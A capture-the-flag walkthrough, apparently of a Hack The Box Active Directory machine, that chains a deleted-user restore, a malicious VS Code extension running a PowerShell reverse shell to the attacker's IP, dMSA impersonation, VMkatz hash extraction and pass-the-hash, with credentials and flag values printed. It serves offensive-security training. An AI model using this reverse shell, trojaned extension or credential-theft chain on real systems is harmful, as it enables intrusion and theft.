---
description: 'Difficulty: Medium | OS: Windows (Active Directory)'
---

# Checkpoint

***

### Attack Chain

```
Recon → LDAP Enumeration (alex.turner) → Restore Deleted AD User (mark.davies)
→ SMB Enumeration → Malicious VSIX Upload (DevDrop) → RCE as ryan.brooks
→ dMSA Abuse (svc_deploy impersonation) → WinRM as svc_deploy
→ VMware Memory Snapshot (VMkatz) → Admin NTLM Hash → Pass-the-Hash → Root
```

***

### Executive Summary

| Phase            | Details                                                                                |
| ---------------- | -------------------------------------------------------------------------------------- |
| Initial Access   | Valid credentials for `alex.turner` provided                                           |
| Enumeration      | LDAP revealed write permissions over Deleted Objects and Employees OU                  |
| Privesc #1       | Restored deleted user `mark.davies`, authenticated with known password                 |
| Discovery        | Enumerated SMB shares, found writable `DevDrop` share for VS Code extensions           |
| Code Execution   | Uploaded malicious VSIX package with PowerShell reverse shell → shell as `ryan.brooks` |
| Privesc #2       | dMSA abuse to impersonate `svc_deploy` and recover credentials                         |
| Lateral Movement | Authenticated as `svc_deploy` via WinRM                                                |
| Sensitive Data   | Identified VMware backup files in `VMBackups` share                                    |
| Cred Extraction  | Used VMkatz against VM memory snapshot → local Administrator NTLM hash                 |
| Privesc #3       | Pass-the-Hash as Administrator                                                         |
| Root Flag        | `C:\Users\max.palmer\Desktop\root.txt`                                                 |

***

### 1. Reconnaissance

```bash
# Attack machine
sudo nmap -sC -sV -T4 10.129.109.27 -Pn
```

**Output:**

```
PORT     STATE SERVICE           VERSION
53/tcp   open  domain            Simple DNS Plus
88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
135/tcp  open  msrpc             Microsoft Windows RPC
139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ldapssl
3268/tcp open  ldap
3269/tcp open  globalcatLDAPssl
5985/tcp open  http              Microsoft HTTPAPI httpd 2.0

| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
```

Domain: `checkpoint.htb`, Hostname: `DC01.checkpoint.htb` (from LDAP + SSL cert).

***

### 2. Environment Setup

```bash
# Attack machine
sudo ip link set dev tun0 mtu 1300
sudo sed -i '/checkpoint/d' /etc/hosts
echo "10.129.109.27 checkpoint.htb dc01.checkpoint.htb DC01.CHECKPOINT.HTB dc01" | sudo tee -a /etc/hosts

# Sync clock with DC (important for Kerberos)
DCT=$(nmap --script smb2-time -p445 10.129.109.27 -oN - | awk -F'date: ' '/\| *date:/ {print $2}' | sed 's/T/ /' | head -1)
echo $DCT
```

#### Verify initial credentials

```bash
# Attack machine
nxc smb 10.129.109.27 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
```

**Output:**

```
SMB  10.129.109.27  445  DC01  [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

***

### 3. LDAP Enumeration — Find Writable Objects

```bash
# Attack machine
bloodyAD --host 10.129.109.27 --dns 10.129.109.27 -d checkpoint.htb \
  -u alex.turner -p 'Checkpoint2024!' get writable
```

**Output (key entries):**

```
distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
permission: CREATE_CHILD

distinguishedName: CN=Mark Davies\0ADEL:...,CN=Deleted Objects,DC=checkpoint,DC=htb
permission: WRITE
```

`alex.turner` has WRITE permission over the deleted object `mark.davies` — we can restore it.

***

### 4. Restore Deleted AD User — mark.davies

```bash
# Attack machine
bloodyAD --host DC01.checkpoint.htb --dc-ip 10.129.109.27 \
  -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
  set restore mark.davies
```

**Output:**

```
[+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

#### Test restored account with same password

```bash
# Attack machine
nxc smb 10.129.109.27 -d checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares
```

**Output:**

```
[+] checkpoint.htb\mark.davies:Checkpoint2024!

Share        Permissions   Remark
-----        -----------   ------
ADMIN$                     Remote Admin
C$                         Default share
DevDrop      READ,WRITE    VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
IPC$         READ          Remote IPC
NETLOGON     READ          Logon server share
SYSVOL       READ          Logon server share
VMBackups
```

`DevDrop` is writable and is used to deploy VS Code extensions — a perfect code execution vector.

***

### 5. Malicious VSIX Package → RCE as ryan.brooks

#### Generate base64 PowerShell reverse shell payload

```bash
# Attack machine
LHOST="10.10.14.43"
LPORT="4444"
B64=$(python3 -c "
import base64
cmd = '\$client = New-Object System.Net.Sockets.TCPClient(\"$LHOST\",$LPORT);\$stream = \$client.GetStream();[byte[]]\$bytes = 0..65535|%{0};while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){;\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0, \$i);\$sendback = (iex \$data 2>&1 | Out-String );\$sendback2 = \$sendback + \"PS \" + (pwd).Path + \"> \";\$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()'
print(base64.b64encode(cmd.encode('utf-16-le')).decode())
")
echo "B64: $B64"
```

#### Build malicious VSIX package

```bash
# Attack machine
mkdir -p /tmp/evil-ext/extension

# package.json
cat > /tmp/evil-ext/extension/package.json << 'EOF'
{
  "name": "checkpoint-theme",
  "displayName": "Checkpoint Theme",
  "description": "Official Checkpoint color theme",
  "version": "1.0.0",
  "publisher": "checkpoint",
  "engines": { "vscode": "^1.118.0" },
  "activationEvents": ["*"],
  "main": "./extension.js",
  "contributes": {}
}
EOF

# extension.js — executes reverse shell on activation
cat > /tmp/evil-ext/extension/extension.js << EOF
const { execSync } = require('child_process');
function activate(context) {
  try {
    execSync('powershell -e $B64');
  } catch(e) {}
}
function deactivate() {}
module.exports = { activate, deactivate };
EOF

# VSIX manifest
cat > /tmp/evil-ext/extension.vsixmanifest << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
  <Metadata>
    <Identity Language="en-US" Id="checkpoint-theme" Version="1.0.0" Publisher="checkpoint"/>
    <DisplayName>Checkpoint Theme</DisplayName>
    <Description>Official Checkpoint color theme</Description>
  </Metadata>
  <Installation>
    <InstallationTarget Id="Microsoft.VisualStudio.Code"/>
  </Installation>
  <Assets>
    <Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json"/>
  </Assets>
</PackageManifest>
EOF

cat > '/tmp/evil-ext/[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension=".vsixmanifest" ContentType="text/xml"/>
  <Default Extension=".json" ContentType="application/json"/>
  <Default Extension=".js" ContentType="application/javascript"/>
</Types>
EOF

# Package as .vsix (zip)
cd /tmp/evil-ext
zip -r checkpoint-theme-1.0.0.vsix extension/ extension.vsixmanifest "[Content_Types].xml"
ls -la checkpoint-theme-1.0.0.vsix
```

#### Upload to DevDrop share

```bash
# Attack machine
smbclient //10.129.109.27/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
  -c 'put /tmp/evil-ext/checkpoint-theme-1.0.0.vsix checkpoint-theme-1.0.0.vsix'

echo "[+] Payload uploaded! Waiting for shell on port 4444..."
```

#### Catch the reverse shell

```bash
# Attack machine
nc -lvnp 4444
```

**Shell received:**

```
connect to [10.10.14.43] from (UNKNOWN) [10.129.109.27] 50983
whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code>
```

**User flag:**

```powershell
# Target — as ryan.brooks
cat C:\Users\ryan.brooks\Desktop\user.txt
# 92a144ca831be404a8f95087c56c7091
```

***

### 6. Privilege Escalation — dMSA Abuse (svc\_deploy Impersonation)

#### Get TGT for ryan.brooks using AES key

```bash
# Attack machine
DCT=$(nmap --script smb2-time -p445 10.129.109.27 -oN - | awk -F'date: ' '/\| *date:/ {print $2}' | sed 's/T/ /' | head -1)

TZ=UTC faketime "$DCT" impacket-getTGT \
  -aesKey 545b2e59b9c2c2ed01bf5b3972a360818f88f1a35311de3eeb06277a265b9099 \
  checkpoint.htb/ryan.brooks \
  -dc-ip 10.129.109.27
```

**Output:**

```
[*] Saving ticket in ryan.brooks.ccache
```

#### Create dMSA to impersonate svc\_deploy

```bash
# Attack machine
bloodyad -u ryan.brooks -d checkpoint.htb \
  -H DC01.checkpoint.htb -i 10.129.109.27 \
  -k ccache=ryan.brooks.ccache \
  add badSuccessor evil_dmsa \
  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
```

**Output (key hashes recovered):**

```
dMSA current keys found in TGS:
AES256: 4116f5a27a38d98bf575df84e95dd0f5dd0196c8f6b3d6fbb8019758480fa25b
AES128: d146531a5797af68dd5cd790411fe67b
RC4: 0e4fb4e7acd06e85cc26c74684f1bf23

dMSA previous keys (including preceding managed accounts):
RC4: e16081eb077aca74bdbf8af12af43ac9
```

***

### 7. Lateral Movement — WinRM as svc\_deploy

```bash
# Attack machine
evil-winrm -i 10.129.109.27 -u checkpoint.htb\\svc_deploy -H "e16081eb077aca74bdbf8af12af43ac9"
```

**Output:**

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

***

### 8. VMware Memory Snapshot — Extract Administrator Hash

#### Enumerate VMBackups share

```powershell
# Target — as svc_deploy
dir "\\DC01.checkpoint.htb\VMBackups" -Recurse -Force -ErrorAction SilentlyContinue
```

**Output:**

```
Directory: \\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01\memory forensics

Mode    Length   Name
----    ------   ----
-a----  106496000   Windows Server 2019-000001.vmdk
-a----  2147483648  Windows Server 2019-Snapshot1.vmem   <-- memory snapshot
-a----  138164859   Windows Server 2019-Snapshot1.vmsn
-a----  10199695360 Windows Server 2019.vmdk
```

#### Download and run VMkatz

```bash
# Attack machine
cd /tmp
wget https://github.com/nikaiw/VMkatz/releases/download/v1.2.2/vmkatz-v1.2.2-windows-x86_64.zip
unzip vmkatz-v1.2.2-windows-x86_64.zip
```

```powershell
# Target — as svc_deploy
upload /tmp/vmkatz.exe vmkatz.exe

.\vmkatz.exe "\\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem"
```

**Output (key credentials):**

```
LUID: 0x14016d
Username: Administrator
Domain: WIN-0DG6SJAEUTA

[MSV1_0]
  NT Hash : f29e9c014295b9b32139b09a2790be3b
  SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
```

***

### 9. Pass-the-Hash → Administrator

```bash
# Attack machine
evil-winrm -i 10.129.109.27 -u checkpoint.htb\\Administrator -H "f29e9c014295b9b32139b09a2790be3b"
```

**Output:**

```
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

#### Find and read root flag

```powershell
# Target — as Administrator
dir "C:\" -Recurse -Include "root.txt" -Force -ErrorAction SilentlyContinue

cat C:\Users\max.palmer\Desktop\root.txt
# 864d9d13edb008ab521d024ee7f66a14
```

***

### Credentials Summary

| Account       | Password / Hash                       | Source                            |
| ------------- | ------------------------------------- | --------------------------------- |
| alex.turner   | Checkpoint2024!                       | Provided                          |
| mark.davies   | Checkpoint2024!                       | Password reuse (restored AD user) |
| ryan.brooks   | AES256: 545b2e59...                   | Extracted post-shell              |
| svc\_deploy   | RC4: e16081eb077aca74bdbf8af12af43ac9 | dMSA abuse                        |
| Administrator | NT: f29e9c014295b9b32139b09a2790be3b  | VMkatz memory dump                |

***

### Flags

| Flag     | Value                            |
| -------- | -------------------------------- |
| user.txt | 92a144ca831be404a8f95087c56c7091 |
| root.txt | 864d9d13edb008ab521d024ee7f66a14 |

***

### Key Vulnerabilities & Lessons Learned

| Step       | Vulnerability                               | Impact                         |
| ---------- | ------------------------------------------- | ------------------------------ |
| Recon      | LDAP writable object enumeration            | Discovered restore permissions |
| Privesc #1 | Write access to deleted AD objects          | Restored mark.davies           |
| Foothold   | Writable VS Code extension share            | RCE as ryan.brooks             |
| Privesc #2 | dMSA badSuccessor abuse                     | Impersonated svc\_deploy       |
| Privesc #3 | Cleartext credentials in VM memory snapshot | Administrator NTLM hash        |
| Final      | Pass-the-Hash                               | Domain Administrator access    |

**Takeaways:**

* Always enumerate writable LDAP objects — deleted object restore is an underrated attack path
* Writable software deployment shares (VSIX, MSI, scripts) are almost always RCE opportunities
* dMSA (Delegated Managed Service Accounts) abuse is a powerful modern AD attack technique
* VMware memory snapshots stored on accessible shares are extremely sensitive — they contain cleartext credentials
* Clock synchronization is critical for Kerberos attacks (`faketime` + `smb2-time` nmap script)
* Pass-the-Hash with evil-winrm works cleanly against WinRM-enabled Windows hosts
